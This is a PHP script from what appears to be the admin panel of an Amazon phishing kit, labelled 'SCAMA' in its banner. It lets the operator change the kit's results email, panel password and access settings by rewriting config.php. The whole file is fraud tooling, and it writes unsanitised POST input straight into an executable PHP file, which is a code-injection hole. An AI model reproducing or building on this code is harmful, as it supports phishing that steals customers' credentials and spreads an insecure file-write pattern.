<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
ob_start();
session_start();
ob_end_clean();
if(!isset($_SESSION['username'])){
header("location:login.php");
exit;
}
include "../config.php";
$getUpdateType = $_POST['updateType'];
//read the entire string
$str=file_get_contents('../config.php');
if($getUpdateType=="1"){
    $getYour_EmailValue = $_POST['Your_Email'];
    $str=str_replace($Your_Email, $getYour_EmailValue, $str);
}elseif($getUpdateType=="2"){
    $getPanelPassword = $_POST['panelPassword'];
    $str=str_replace($Password, $getPanelPassword,$str);
}elseif($getUpdateType=="3"){
    $getparam = $_POST['param'];
    $str=str_replace($param, $getparam,$str);
}elseif($getUpdateType=="4"){
    $getOne_Time_Access = $_POST['One_Time_Access'];
    $str=str_replace($One_Time_Access, $getOne_Time_Access,$str);
}
/* elseif($getUpdateType=="5"){
    $gett_login = $_POST['t_login'];
    $str=str_replace($t_login, $gett_login,$str);
} */
/* elseif($getUpdateType=="6"){
    $gettypelogin = $_POST['typelogin'];
    $str=str_replace($typelogin, $gettypelogin,$str);
} */
//write the entire string
file_put_contents('../config.php', $str);
header("Location: ./");
?>